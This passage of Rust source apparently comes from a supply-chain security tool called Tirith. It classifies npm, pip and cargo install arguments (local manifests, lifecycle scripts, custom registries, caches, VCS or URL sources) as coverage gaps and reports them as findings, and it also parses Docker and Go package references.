                    kind: InstallCoverageGapKind::ManifestOrLocalSource,
                    argument: manifest.display().to_string(),
                    reason: format!(
                        "npm project manifest is not valid UTF-8 and cannot be inspected: {error}"
                    ),
                });
            }
        };
        if let Some(gap) = npm_project_manifest_content_coverage_gap(&manifest, &content) {
            return Some(gap);
        }
    }
    None
}

/// Derive npm project-manifest coverage from bytes captured and fingerprinted
/// by the caller. This function performs no filesystem read; pairing its result
/// with pre-spawn verification of the same capture closes manifest ABA races.
pub fn captured_npm_project_manifest_coverage_gap(
    path: &std::path::Path,
    content: &str,
    args: &[String],
) -> Option<InstallCoverageGap> {
    if npm_install_uses_global_location(args) {
        return None;
    }
    npm_project_manifest_content_coverage_gap(path, content)
}

fn npm_project_manifest_content_coverage_gap(
    manifest: &std::path::Path,
    content: &str,
) -> Option<InstallCoverageGap> {
    let parsed: serde_json::Value = match serde_json::from_str(content) {
        Ok(parsed) => parsed,
        Err(error) => {
            return Some(InstallCoverageGap {
                kind: InstallCoverageGapKind::ManifestOrLocalSource,
                argument: manifest.display().to_string(),
                reason: format!("npm project manifest could not be parsed before install: {error}"),
            });
        }
    };
    let mut executable_inputs = Vec::new();
    for key in [
        "dependencies",
        "devDependencies",
        "optionalDependencies",
        "peerDependencies",
        "overrides",
    ] {
        if parsed
            .get(key)
            .and_then(serde_json::Value::as_object)
            .is_some_and(|values| !values.is_empty())
        {
            executable_inputs.push(key);
        }
    }
    if parsed.get("workspaces").is_some_and(|workspaces| {
        workspaces
            .as_array()
            .is_some_and(|values| !values.is_empty())
            || workspaces
                .as_object()
                .is_some_and(|values| !values.is_empty())
    }) {
        executable_inputs.push("workspaces");
    }
    if parsed
        .get("scripts")
        .and_then(serde_json::Value::as_object)
        .is_some_and(|scripts| {
            [
                "preinstall",
                "install",
                "postinstall",
                "prepublish",
                "preprepare",
                "prepare",
                "postprepare",
                "predependencies",
                "dependencies",
                "postdependencies",
            ]
            .iter()
            .any(|hook| {
                scripts
                    .get(*hook)
                    .and_then(serde_json::Value::as_str)
                    .is_some_and(|body| !body.trim().is_empty())
            })
        })
    {
        executable_inputs.push("install lifecycle scripts");
    }
    (!executable_inputs.is_empty()).then(|| InstallCoverageGap {
        kind: InstallCoverageGapKind::ManifestOrLocalSource,
        argument: manifest.display().to_string(),
        reason: format!(
            "npm may install or execute unscored current-project inputs from {} ({})",
            manifest.display(),
            executable_inputs.join(", ")
        ),
    })
}

fn npm_install_uses_global_location(args: &[String]) -> bool {
    let mut global = false;
    let mut index = 0;
    while index < args.len() {
        let argument = &args[index];
        if argument == "--" {
            break;
        }
        match argument.as_str() {
            "-g" | "--global" => {
                if let Some(value) = args.get(index.saturating_add(1)) {
                    if value.eq_ignore_ascii_case("false") {
                        global = false;
                        index = index.saturating_add(2);
                        continue;
                    }
                    if value.eq_ignore_ascii_case("true") {
                        global = true;
                        index = index.saturating_add(2);
                        continue;
                    }
                }
                global = true;
            }
            "--global=true" => global = true,
            "--global=false" | "--no-global" => global = false,
            _ => {}
        }
        index = index.saturating_add(1);
    }
    global
}

fn analyze_npm_coverage(args: &[String], coverage: &mut InstallCoverage) {
    if args.is_empty() {
        manifest_gap(
            coverage,
            "(no package argument)",
            "npm will read the local package manifest and lockfile",
        );
        return;
    }
    const VALUE_FLAGS: &[&str] = &[
        "--tag",
        "--scope",
        "--otp",
        "--before",
        "--install-strategy",
        "--omit",
        "--include",
    ];
    const BOOL_FLAGS: &[&str] = &[
        "--save",
        "--save-dev",
        "--save-optional",
        "--save-peer",
        "--save-exact",
        "--ignore-scripts",
        "--foreground-scripts",
        "--dry-run",
        "--force",
        "--legacy-peer-deps",
        "--strict-peer-deps",
        "--audit",
        "--no-audit",
        "--fund",
        "--no-fund",
        "--production",
        "--prefer-online",
        "--include-workspace-root",
        "-D",
        "-O",
        "-P",
        "-E",
    ];

    let mut index = 0;
    let mut saw_package_operand = false;
    while index < args.len() {
        let argument = &args[index];
        if argument == "--" {
            index += 1;
            continue;
        }
        if matches!(argument.as_str(), "-g" | "--global") {
            if args.get(index + 1).is_some_and(|value| {
                value.eq_ignore_ascii_case("true") || value.eq_ignore_ascii_case("false")
            }) {
                index += 2;
            } else {
                index += 1;
            }
            continue;
        }
        if argument == "--registry" {
            if let Some(value) = args.get(index + 1) {
                if !is_official_registry(PackageManager::Npm, value) {
                    registry_gap(
                        coverage,
                        &format!("--registry {value}"),
                        "npm will install from a registry other than the validated npm origin",
                    );
                }
                index += 2;
            } else {
                missing_value_gap(coverage, argument);
                index += 1;
            }
            continue;
        }
        if let Some(value) = argument.strip_prefix("--registry=") {
            if value.is_empty() {
                missing_value_gap(coverage, "--registry");
            } else if !is_official_registry(PackageManager::Npm, value) {
                registry_gap(
                    coverage,
                    argument,
                    "npm will install from a registry other than the validated npm origin",
                );
            }
            index += 1;
            continue;
        }
        if matches!(argument.as_str(), "--userconfig" | "--globalconfig") {
            if let Some(value) = args.get(index + 1) {
                registry_gap(
                    coverage,
                    &format!("{argument} {value}"),
                    "npm will load source selection from an alternate configuration file",
                );
                index += 2;
            } else {
                missing_value_gap(coverage, argument);
                index += 1;
            }
            continue;
        }
        if argument.starts_with("--userconfig=") || argument.starts_with("--globalconfig=") {
            registry_gap(
                coverage,
                argument,
                "npm will load source selection from an alternate configuration file",
            );
            index += 1;
            continue;
        }
        if argument == "--prefix" {
            if let Some(value) = args.get(index + 1) {
                manifest_gap(
                    coverage,
                    &format!("--prefix {value}"),
                    "npm will resolve project and configuration inputs from an alternate prefix outside the ordinary transaction context",
                );
                index += 2;
            } else {
                missing_value_gap(coverage, argument);
                index += 1;
            }
            continue;
        }
        if argument.starts_with("--prefix=") {
            manifest_gap(
                coverage,
                argument,
                "npm will resolve project and configuration inputs from an alternate prefix outside the ordinary transaction context",
            );
            index += 1;
            continue;
        }
        if argument == "--cache" {
            if let Some(value) = args.get(index + 1) {
                registry_gap(
                    coverage,
                    &format!("--cache {value}"),
                    "npm may reuse package bytes from an alternate cache that is not bound to the validated registry response",
                );
                index += 2;
            } else {
                missing_value_gap(coverage, argument);
                index += 1;
            }
            continue;
        }
        if argument.starts_with("--cache=") {
            registry_gap(
                coverage,
                argument,
                "npm may reuse package bytes from an alternate cache that is not bound to the validated registry response",
            );
            index += 1;
            continue;
        }
        if matches!(argument.as_str(), "--offline" | "--prefer-offline") {
            registry_gap(
                coverage,
                argument,
                "npm may install cached package bytes without obtaining the validated registry response",
            );
            index += 1;
            continue;
        }
        if argument == "--no-package-lock" {
            if args
                .get(index + 1)
                .is_some_and(|value| value.eq_ignore_ascii_case("false"))
            {
                manifest_gap(
                    coverage,
                    "--no-package-lock false",
                    "npm re-enables package-lock.json or npm-shrinkwrap.json when the negated option receives false",
                );
                index += 2;
            } else if args
                .get(index + 1)
                .is_some_and(|value| value.eq_ignore_ascii_case("true"))
            {
                index += 2;
            } else {
                index += 1;
            }
            continue;
        }
        if let Some(value) = argument.strip_prefix("--no-package-lock=") {
            if value.eq_ignore_ascii_case("false") {
                manifest_gap(
                    coverage,
                    argument,
                    "npm re-enables package-lock.json or npm-shrinkwrap.json when the negated option receives false",
                );
            } else if !value.eq_ignore_ascii_case("true") {
                unknown_flag_gap(coverage, argument, PackageManager::Npm);
            }
            index += 1;
            continue;
        }
        if argument == "--package-lock"
            || argument
                .strip_prefix("--package-lock=")
                .is_some_and(|value| value != "false")
        {
            manifest_gap(
                coverage,
                argument,
                "npm may consume package-lock.json or npm-shrinkwrap.json resolved URLs that were not included in per-package provenance",
            );
            index += 1;
            continue;
        }
        if argument == "--package-lock=false" {
            index += 1;
            continue;
        }
        if argument == "--workspaces" {
            manifest_gap(
                coverage,
                argument,
                "npm will add dependencies selected from workspace manifests",
            );
            index += 1;
            continue;
        }
        if argument == "--workspace" || argument == "-w" {
            if let Some(value) = args.get(index + 1) {
                manifest_gap(
                    coverage,
                    &format!("{argument} {value}"),
                    "npm will add dependencies selected from a workspace manifest",
                );
                index += 2;
            } else {
                missing_value_gap(coverage, argument);
                index += 1;
            }
            continue;
        }
        if argument.starts_with("--workspace=") {
            manifest_gap(
                coverage,
                argument,
                "npm will add dependencies selected from a workspace manifest",
            );
            index += 1;
            continue;
        }
        if VALUE_FLAGS.contains(&argument.as_str()) {
            if args.get(index + 1).is_some() {
                index += 2;
            } else {
                missing_value_gap(coverage, argument);
                index += 1;
            }
            continue;
        }
        if VALUE_FLAGS
            .iter()
            .any(|flag| argument.starts_with(&format!("{flag}=")))
            || BOOL_FLAGS.contains(&argument.as_str())
        {
            index += 1;
            continue;
        }
        if argument.starts_with('-') {
            unknown_flag_gap(coverage, argument, PackageManager::Npm);
            index += 1;
            continue;
        }
        saw_package_operand = true;
        classify_npm_operand(argument, coverage);
        index += 1;
    }

    // `npm install` remains manifest-driven when the command contains only
    // options. This form is reachable through the public CLI even though an
    // entirely empty argument vector is rejected there; options such as
    // `--foreground-scripts` still install the current project and execute its
    // lifecycle hooks.
    if !saw_package_operand {
        manifest_gap(
            coverage,
            "(no package operand)",
            "npm will read the local package manifest and lockfile because no explicit package operand was supplied",
        );
    }
}

fn classify_npm_operand(argument: &str, coverage: &mut InstallCoverage) {
    let lower = argument.to_ascii_lowercase();
    let source_spec = npm_source_spec(argument);
    let source_lower = source_spec.unwrap_or(argument).to_ascii_lowercase();
    let local_archive = [".tgz", ".tar", ".tar.gz", ".tar.bz2", ".tar.xz", ".zip"]
        .iter()
        .any(|suffix| lower.ends_with(suffix));
    let local_source = source_lower.starts_with("file:")
        || source_lower.starts_with("link:")
        || source_lower.starts_with("workspace:")
        || source_lower.starts_with("./")
        || source_lower.starts_with("../")
        || source_lower.starts_with('/')
        || source_lower.contains('\\')
        || local_archive;
    if local_source
        || lower.starts_with("file:")
        || lower.starts_with("link:")
        || lower.starts_with("workspace:")
        || argument.starts_with('.')
        || argument.starts_with('/')
        || argument.starts_with('~')
        || argument.contains('\\')
    {
        manifest_gap(
            coverage,
            argument,
            "npm will install executable package content from a local or workspace source",
        );
    } else if lower.contains("@npm:")
        || is_npm_remote_source(&source_lower)
        || argument.contains("://")
        || !is_valid_npm_registry_spec(argument)
    {
        remote_source_gap(
            coverage,
            argument,
            "npm will install executable package content from an alias, URL, VCS, or shorthand source",
        );
    }
}

/// Return the portion after an npm package name when the operand is a named
/// spec (`name@spec` or `@scope/name@spec`). A bare scoped package has no
/// source spec.
fn npm_source_spec(argument: &str) -> Option<&str> {
    if argument.starts_with('@') {
        let slash = argument.find('/')?;
        let tail = &argument[slash + 1..];
        let at = tail.find('@')?;
        Some(&tail[at + 1..])
    } else {
        argument
            .find('@')
            .map(|at| &argument[at.saturating_add(1)..])
    }
}

fn is_npm_remote_source(spec_lower: &str) -> bool {
    spec_lower.starts_with("git+")
        || spec_lower.starts_with("git@")
        || spec_lower.starts_with("git:")
        || spec_lower.starts_with("gist:")
        || spec_lower.starts_with("github:")
        || spec_lower.starts_with("gitlab:")
        || spec_lower.starts_with("bitbucket:")
        || spec_lower.starts_with("http:")
        || spec_lower.starts_with("https:")
        || spec_lower.contains("://")
}

/// Conservative npm registry-spec recognizer. Anything that is not a plain
/// package identity plus an optional registry version/tag/range is surfaced as
/// a direct-source gap instead of being silently treated as registry-backed.
fn is_valid_npm_registry_spec(argument: &str) -> bool {
    if argument.is_empty() || argument.chars().any(char::is_control) {
        return false;
    }
    let (name, spec) = if argument.starts_with('@') {
        let Some(slash) = argument.find('/') else {
            return false;
        };
        let scope = &argument[1..slash];
        let tail = &argument[slash + 1..];
        if scope.is_empty() || tail.is_empty() {
            return false;
        }
        if let Some(at) = tail.find('@') {
            (&argument[..slash + 1 + at], Some(&tail[at + 1..]))
        } else {
            (argument, None)
        }
    } else if let Some(at) = argument.find('@') {
        (&argument[..at], Some(&argument[at + 1..]))
    } else {
        (argument, None)
    };
    if name.is_empty() || name.contains('\\') {
        return false;
    }
    let slash_count = name.bytes().filter(|byte| *byte == b'/').count();
    if (name.starts_with('@') && slash_count != 1)
        || (!name.starts_with('@') && slash_count != 0)
        || name.contains(':')
    {
        return false;
    }
    match spec {
        None => true,
        Some("") => true,
        Some(spec) => {
            let lower = spec.to_ascii_lowercase();
            !lower.starts_with("file:")
                && !lower.starts_with("link:")
                && !lower.starts_with("workspace:")
                && !lower.starts_with("npm:")
                && !is_npm_remote_source(&lower)
                && !spec.contains('/')
                && !spec.contains('\\')
                && !spec.contains(':')
        }
    }
}

fn analyze_pip_coverage(args: &[String], coverage: &mut InstallCoverage) {
    const MANIFEST_FLAGS: &[&str] = &[
        "-r",
        "--requirement",
        "--requirements",
        "-c",
        "--constraint",
        "-e",
        "--editable",
    ];
    const SOURCE_FLAGS: &[&str] = &[
        "--index-url",
        "-i",
        "--extra-index-url",
        "--find-links",
        "-f",
    ];
    const VALUE_FLAGS: &[&str] = &[
        "--target",
        "-t",
        "--root",
        "--prefix",
        "--src",
        "--build",
        "-b",
        "--config-settings",
        "--global-option",
        "--install-option",
        "--retries",
        "--timeout",
        "--exists-action",
        "--platform",
        "--python-version",
        "--implementation",
        "--abi",
        "--only-binary",
        "--no-binary",
    ];
    const BOOL_FLAGS: &[&str] = &[
        "--pre",
        "--upgrade",
        "-U",
        "--force-reinstall",
        "--ignore-installed",
        "-I",
        "--no-deps",
        "--no-build-isolation",
        "--use-pep517",
        "--no-use-pep517",
        "--compile",
        "--no-compile",
        "--user",
        "--dry-run",
        "--require-hashes",
        "--prefer-binary",
        "--break-system-packages",
        "--disable-pip-version-check",
        "--isolated",
        "--no-cache-dir",
        "-q",
        "--quiet",
        "-v",
        "--verbose",
    ];

    let mut index = 0;
    while index < args.len() {
        let argument = &args[index];
        if argument == "--" {
            index += 1;
            continue;
        }
        if argument == "--no-index" {
            registry_gap(
                coverage,
                argument,
                "pip will disable registry resolution, so PyPI provenance cannot describe the installed artifact",
            );
            index += 1;
            continue;
        }
        if matches!(
            argument.as_str(),
            "--proxy" | "--trusted-host" | "--cert" | "--client-cert"
        ) {
            if let Some(value) = args.get(index + 1) {
                registry_gap(
                    coverage,
                    &format!("{argument} {value}"),
                    "pip transport or certificate overrides prevent Tirith from binding installed bytes to its validated PyPI request",
                );
                index += 2;
            } else {
                missing_value_gap(coverage, argument);
                index += 1;
            }
            continue;
        }
        if ["--proxy=", "--trusted-host=", "--cert=", "--client-cert="]
            .iter()
            .any(|prefix| argument.starts_with(prefix))
        {
            registry_gap(
                coverage,
                argument,
                "pip transport or certificate overrides prevent Tirith from binding installed bytes to its validated PyPI request",
            );
            index += 1;
            continue;
        }
        if MANIFEST_FLAGS.contains(&argument.as_str()) {
            if let Some(value) = args.get(index + 1) {
                let kind_remote =
                    matches!(argument.as_str(), "-e" | "--editable") && is_remote_operand(value);
                if kind_remote {
                    remote_source_gap(
                        coverage,
                        &format!("{argument} {value}"),
                        "pip editable mode will build executable content from a remote source",
                    );
                } else {
                    manifest_gap(
                        coverage,
                        &format!("{argument} {value}"),
                        "pip will read requirements, constraints, or build metadata outside per-package scoring",
                    );
                }
                index += 2;
            } else {
                missing_value_gap(coverage, argument);
                index += 1;
            }
            continue;
        }
        if (argument.starts_with("-r") || argument.starts_with("-c") || argument.starts_with("-e"))
            && argument.len() > 2
            && !argument.starts_with("--")
        {
            manifest_gap(
                coverage,
                argument,
                "pip joined short-form input selects a manifest, constraint, or editable source",
            );
            index += 1;
            continue;
        }
        if [
            "--requirement=",
            "--requirements=",
            "--constraint=",
            "--editable=",
        ]
        .iter()
        .any(|prefix| argument.starts_with(prefix))
        {
            manifest_gap(
                coverage,
                argument,
                "pip will read a manifest or editable source outside per-package scoring",
            );
            index += 1;
            continue;
        }
        if SOURCE_FLAGS.contains(&argument.as_str()) {
            if let Some(value) = args.get(index + 1) {
                let official_primary = matches!(argument.as_str(), "--index-url" | "-i")
                    && is_official_registry(PackageManager::Pip, value);
                if !official_primary {
                    registry_gap(
                        coverage,
                        &format!("{argument} {value}"),
                        "pip source selection is custom or ambiguous and cannot reuse PyPI provenance",
                    );
                }
                index += 2;
            } else {
                missing_value_gap(coverage, argument);
                index += 1;
            }
            continue;
        }
        if let Some((flag, value)) = argument.split_once('=') {
            if SOURCE_FLAGS.contains(&flag) {
                let official_primary =
                    flag == "--index-url" && is_official_registry(PackageManager::Pip, value);
                if value.is_empty() {
                    missing_value_gap(coverage, flag);
                } else if !official_primary {
                    registry_gap(
                        coverage,
                        argument,
                        "pip source selection is custom or ambiguous and cannot reuse PyPI provenance",
                    );
                }
                index += 1;
                continue;
            }
        }
        if argument == "--cache-dir" {
            if let Some(value) = args.get(index + 1) {
                registry_gap(
                    coverage,
                    &format!("--cache-dir {value}"),
                    "pip may reuse package bytes from an alternate cache outside the source binding",
                );
                index += 2;
            } else {
                missing_value_gap(coverage, argument);
                index += 1;
            }
            continue;
        }
        if argument.starts_with("--cache-dir=") {
            registry_gap(
                coverage,
                argument,
                "pip may reuse package bytes from an alternate cache outside the source binding",
            );
            index += 1;
            continue;
        }
        if VALUE_FLAGS.contains(&argument.as_str()) {
            if args.get(index + 1).is_some() {
                index += 2;
            } else {
                missing_value_gap(coverage, argument);
                index += 1;
            }
            continue;
        }
        if VALUE_FLAGS
            .iter()
            .any(|flag| argument.starts_with(&format!("{flag}=")))
            || BOOL_FLAGS.contains(&argument.as_str())
        {
            index += 1;
            continue;
        }
        if argument.starts_with('-') {
            unknown_flag_gap(coverage, argument, PackageManager::Pip);
            index += 1;
            continue;
        }
        match classify_pip_positional_operand(argument) {
            PipPositionalOperand::Registry => {}
            PipPositionalOperand::LocalOrDirectSource => manifest_gap(
                coverage,
                argument,
                "pip will build executable package content from a local path, archive, or non-registry direct reference",
            ),
            PipPositionalOperand::RemoteOrVcsSource => remote_source_gap(
                coverage,
                argument,
                "pip will install executable content from a direct URL or VCS reference",
            ),
        }
        index += 1;
    }
}

fn analyze_cargo_coverage(args: &[String], coverage: &mut InstallCoverage) {
    const SOURCE_FLAGS: &[&str] = &["--registry", "--index"];
    const REMOTE_FLAGS: &[&str] = &["--git"];
    const LOCAL_FLAGS: &[&str] = &["--path"];
    const VALUE_FLAGS: &[&str] = &[
        "--version",
        "--vers",
        "--branch",
        "--tag",
        "--rev",
        "--features",
        "-F",
        "--target-dir",
        "--root",
        "--jobs",
        "-j",
        "--rename",
        "--profile",
        "--target",
        "--color",
    ];
    const BOOL_FLAGS: &[&str] = &[
        "--locked",
        "--offline",
        "--frozen",
        "--force",
        "--no-track",
        "--debug",
        "--all-features",
        "--no-default-features",
        "--quiet",
        "-q",
        "--verbose",
        "-v",
    ];

    let mut index = 0;
    while index < args.len() {
        let argument = &args[index];
        if argument == "--" {
            index += 1;
            continue;
        }
        if SOURCE_FLAGS.contains(&argument.as_str()) {
            if let Some(value) = args.get(index + 1) {
                let official = (argument == "--registry" && value == "crates-io")
                    || (argument == "--index"
                        && is_official_registry(PackageManager::Cargo, value));
                if !official {
                    registry_gap(
                        coverage,
                        &format!("{argument} {value}"),
                        "cargo will select a registry/index other than the validated crates.io origin",
                    );
                }
                index += 2;
            } else {
                missing_value_gap(coverage, argument);
                index += 1;
            }
            continue;
        }
        if argument == "--config" {
            if let Some(value) = args.get(index + 1) {
                registry_gap(
                    coverage,
                    &format!("--config {value}"),
                    "cargo CLI configuration can replace crates.io or select another registry",
                );
                index += 2;
            } else {
                missing_value_gap(coverage, argument);
                index += 1;
            }
            continue;
        }
        if argument.starts_with("--config=") {
            registry_gap(
                coverage,
                argument,
                "cargo CLI configuration can replace crates.io or select another registry",
            );
            index += 1;
            continue;
        }
        if REMOTE_FLAGS.contains(&argument.as_str()) || LOCAL_FLAGS.contains(&argument.as_str()) {
            if let Some(value) = args.get(index + 1) {
                if REMOTE_FLAGS.contains(&argument.as_str()) {
                    remote_source_gap(
                        coverage,
                        &format!("{argument} {value}"),
                        "cargo will build executable content from a VCS source",
                    );
                } else {
                    manifest_gap(
                        coverage,
                        &format!("{argument} {value}"),
                        "cargo will build executable content from a local manifest",
                    );
                }
                index += 2;
            } else {
                missing_value_gap(coverage, argument);
                index += 1;
            }
            continue;
        }
        if let Some((flag, value)) = argument.split_once('=') {
            if SOURCE_FLAGS.contains(&flag) {
                let official = (flag == "--registry" && value == "crates-io")
                    || (flag == "--index" && is_official_registry(PackageManager::Cargo, value));
                if value.is_empty() {
                    missing_value_gap(coverage, flag);
                } else if !official {
                    registry_gap(
                        coverage,
                        argument,
                        "cargo will select a registry/index other than the validated crates.io origin",
                    );
                }
                index += 1;
                continue;
            }
            if flag == "--git" {
                remote_source_gap(
                    coverage,
                    argument,
                    "cargo will build executable content from a VCS source",
                );
                index += 1;
                continue;
            }
            if flag == "--path" {
                manifest_gap(
                    coverage,
                    argument,
                    "cargo will build executable content from a local manifest",
                );
                index += 1;
                continue;
            }
            if VALUE_FLAGS.contains(&flag) && value.is_empty() {
                missing_value_gap(coverage, flag);
                index += 1;
                continue;
            }
        }
        if VALUE_FLAGS.contains(&argument.as_str()) {
            if args.get(index + 1).is_some() {
                index += 2;
            } else {
                missing_value_gap(coverage, argument);
                index += 1;
            }
            continue;
        }
        if VALUE_FLAGS
            .iter()
            .any(|flag| argument.starts_with(&format!("{flag}=")))
            || BOOL_FLAGS.contains(&argument.as_str())
        {
            index += 1;
            continue;
        }
        if argument.starts_with('-') {
            unknown_flag_gap(coverage, argument, PackageManager::Cargo);
            index += 1;
            continue;
        }
        if is_remote_operand(argument) {
            remote_source_gap(
                coverage,
                argument,
                "cargo will build executable content from a VCS or URL source",
            );
        } else if is_local_operand(argument) {
            manifest_gap(
                coverage,
                argument,
                "cargo will build executable content from a local path",
            );
        }
        index += 1;
    }
}

fn is_official_registry(manager: PackageManager, value: &str) -> bool {
    let normalized = value.trim().trim_end_matches('/').to_ascii_lowercase();
    match manager {
        PackageManager::Npm => normalized == "https://registry.npmjs.org",
        PackageManager::Pip => normalized == "https://pypi.org/simple",
        PackageManager::Cargo => matches!(
            normalized.as_str(),
            "https://index.crates.io"
                | "sparse+https://index.crates.io"
                | "https://github.com/rust-lang/crates.io-index"
        ),
        _ => false,
    }
}

fn is_remote_operand(argument: &str) -> bool {
    let lower = argument.to_ascii_lowercase();
    lower.contains("://")
        || lower.starts_with("git+")
        || lower.starts_with("hg+")
        || lower.starts_with("svn+")
        || lower.starts_with("bzr+")
        || lower.starts_with("github:")
        || lower.starts_with("gitlab:")
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PipPositionalOperand {
    Registry,
    LocalOrDirectSource,
    RemoteOrVcsSource,
}

fn classify_pip_positional_operand(argument: &str) -> PipPositionalOperand {
    // pip parses an environment marker before classifying the requirement,
    // then strips trailing extras before `_get_url_from_path`. Mirror that
    // classification order so markers/extras cannot hide a local path/archive.
    let whole = pip_classification_operand(argument);
    if whole == "@" || is_remote_operand(whole) {
        return PipPositionalOperand::RemoteOrVcsSource;
    }

    // A registry distribution name cannot contain `@`. Classify its direct
    // target once, then use that same target for both remote/VCS and local
    // decisions. Any remaining `@` form is still non-registry and must fail
    // closed, including a relative path whose filename itself contains `@`.
    if let Some((_, target)) = whole.split_once('@') {
        let direct_target = target.trim();
        if !direct_target.is_empty() && is_remote_operand(direct_target) {
            return PipPositionalOperand::RemoteOrVcsSource;
        }
        return PipPositionalOperand::LocalOrDirectSource;
    }

    if whole.to_ascii_lowercase().starts_with("file:") {
        return PipPositionalOperand::LocalOrDirectSource;
    }
    if is_local_operand(whole) {
        PipPositionalOperand::LocalOrDirectSource
    } else {
        PipPositionalOperand::Registry
    }
}

fn pip_classification_operand(argument: &str) -> &str {
    let without_marker = argument
        .split_once(';')
        .map_or(argument, |(requirement, _)| requirement)
        .trim();
    if let Some(without_close) = without_marker.strip_suffix(']') {
        if let Some((base, extras)) = without_close.rsplit_once('[') {
            if !base.trim().is_empty() && !extras.is_empty() {
                return base.trim_end();
            }
        }
    }
    without_marker
}

fn is_local_operand(argument: &str) -> bool {
    let lower = argument.to_ascii_lowercase();
    argument == "."
        || argument == ".."
        || argument.starts_with("./")
        || argument.starts_with("../")
        || argument.starts_with('/')
        || argument.starts_with('~')
        || argument.contains('/')
        || argument.contains('\\')
        || [
            ".whl",
            ".zip",
            ".tar",
            ".tar.gz",
            ".tgz",
            ".tar.bz2",
            ".tbz",
            ".tar.xz",
            ".txz",
            ".tlz",
            ".tar.lz",
            ".tar.lzma",
        ]
        .iter()
        .any(|suffix| lower.ends_with(suffix))
}

fn coverage_gap_finding(
    manager: PackageManager,
    gap: &InstallCoverageGap,
    analysis_command: &str,
    policy: &Policy,
) -> Finding {
    let strict = matches!(policy.fail_mode, FailMode::Closed);
    let severity = if strict
        || matches!(
            gap.kind,
            InstallCoverageGapKind::UnverifiedRegistry | InstallCoverageGapKind::ProvenanceMismatch
        ) {
        Severity::High
    } else {
        Severity::Medium
    };
    let title = match gap.kind {
        InstallCoverageGapKind::ManifestOrLocalSource => format!(
            "{} manifest install — executable input was not package-scored",
            manager.label()
        ),
        InstallCoverageGapKind::RemoteOrVcsSource => format!(
            "{} direct-source install — executable input was not provenance-bound",
            manager.label()
        ),
        InstallCoverageGapKind::UnverifiedRegistry => format!(
            "{} install selects an unverified registry/source",
            manager.label()
        ),
        InstallCoverageGapKind::UnresolvedVersion => format!(
            "{} package version is unresolved — registry provenance is unbound",
            manager.label()
        ),
        InstallCoverageGapKind::ProvenanceMismatch => {
            "Registry provenance did not match the selected package identity".to_string()
        }
        InstallCoverageGapKind::InstallScriptUnavailable => {
            "Install-script policy could not be evaluated".to_string()
        }
        _ => format!("{} install analysis is incomplete", manager.label()),
    };
    let remediation = if gap.kind == InstallCoverageGapKind::ManifestOrLocalSource {
        "Run `tirith ecosystem scan` on the referenced manifest or source before installing."
    } else {
        "Use a validated official registry and an exact package version, or inspect the referenced artifact before installing."
    };
    Finding {
        rule_id: RuleId::ThreatSuspiciousPackage,
        severity,
        title,
        description: format!(
            "Tirith could not prove complete coverage for `{analysis_command}`: {}. {} {}",
            gap.reason,
            if strict {
                "Under `fail_mode: closed`, this unverified executable input blocks the install."
            } else {
                "The install requires an explicit warning acknowledgement."
            },
            remediation,
        ),
        evidence: vec![Evidence::Text {
            detail: format!(
                "manager={} coverage_gap={:?} argument={}",
                manager.label(),
                gap.kind,
                gap.argument
            ),
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    }
}

/// M6 ch1 — manager-specific package extraction for the backends the generic
/// [`threatintel::extract_packages`] does not recognize: `Docker`
/// (`<image>[:<tag>|@<digest>]` via [`crate::parse::parse_docker_ref`]) and `Go`
/// (`<module>[@<version>]`, default `latest`). Returns empty for everything else
/// (npm/pip/cargo use the generic extractor; the distro backends have no
/// registry to score against).
fn extract_packages_manager_specific(
    manager: PackageManager,
    user_args: &[String],
) -> Vec<PackageRef> {
    match manager {
        PackageManager::Docker => parse_docker_specs(user_args),
        PackageManager::Go => parse_go_specs(user_args),
        // Explicit (not `_`) so a future manager forces a decision here.
        PackageManager::Npm
        | PackageManager::Pip
        | PackageManager::Cargo
        | PackageManager::Apt
        | PackageManager::Brew
        | PackageManager::Dnf
        | PackageManager::Yum
        | PackageManager::Pacman
        | PackageManager::Scoop => Vec::new(),
    }
}

/// Parse Docker image-ref arguments into [`PackageRef`]s, accepting `<image>`
/// (implicit `library/` namespace, version `latest`), `<image>:<tag>`,
/// `<image>@<digest>`, and `<registry>/<image>[:tag|@digest]`. Flags are
/// skipped; `version` carries the tag or `sha256:...` for a digest.
fn parse_docker_specs(user_args: &[String]) -> Vec<PackageRef> {
    use crate::parse::{parse_docker_ref, UrlLike};
    let mut out = Vec::new();
    let mut i = 0;
    while i < user_args.len() {
        let arg = &user_args[i];
        if arg.starts_with('-') {
            // For a value-bearing flag, skip BOTH flag and value so the value
            // (e.g. `linux/amd64` after `--platform`) isn't read as an image
            // ref. Inline `--flag=value` consumes only one token.
            if !arg.contains('=') && is_docker_value_bearing_flag(arg) && i + 1 < user_args.len() {
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }
        if let UrlLike::DockerRef {
            registry,
            image,
            tag,
            digest,
        } = parse_docker_ref(arg)
        {
            let name = match registry {
                Some(reg) => format!("{reg}/{image}"),
                None => image,
            };
            let version_token = match (tag, digest) {
                (_, Some(d)) => d,
                (Some(t), None) => t,
                (None, None) => "latest".to_string(),
            };
            out.push(PackageRef {
                ecosystem: Ecosystem::Docker,
                name,
                alias: None,
                version: VersionIntent::from_docker_version(&version_token),
            });
        }
        i += 1;
    }
    out
}

/// Docker flags whose separate-token value can look image-like (contains `/` or
/// `:`), so the value must be skipped to avoid misclassifying it as a target.
fn is_docker_value_bearing_flag(flag: &str) -> bool {
    matches!(
        flag,
        "--platform"
            | "--user"
            | "-u"
            | "--volume"
            | "-v"
            | "--mount"
            | "--publish"
            | "-p"
            | "--env"
            | "-e"
            | "--env-file"
            | "--network"
            | "--name"
            | "--hostname"
            | "-h"
            | "--workdir"
            | "-w"
            | "--cidfile"
            | "--entrypoint"
            | "--label"
            | "-l"
            | "--add-host"
            | "--device"
            | "--dns"
            | "--restart"
            | "--memory"
            | "-m"
            | "--cpus"
            | "--log-driver"
            | "--log-opt"
    )
}

/// Parse Go module-spec arguments into [`PackageRef`]s: `<module>` (version
/// defaults to `latest`) or `<module>@<version>`. Flags are skipped; a module
/// path must contain a `.` or `/` (a plain `nginx` is ignored).
fn parse_go_specs(user_args: &[String]) -> Vec<PackageRef> {
    let mut out = Vec::new();
    for arg in user_args {
        if arg.starts_with('-') {
            continue;
        }
        let (name, version_token) = match arg.rsplit_once('@') {
            Some((n, v)) if !n.is_empty() && !v.is_empty() => (n, v.to_string()),
            _ => (arg.as_str(), "latest".to_string()),
        };
        // Reject local-path targets (`./cmd/foo`, `/abs/...`, `~/repo/...`):
        // they're filesystem paths, not registry modules.
        if name == "."
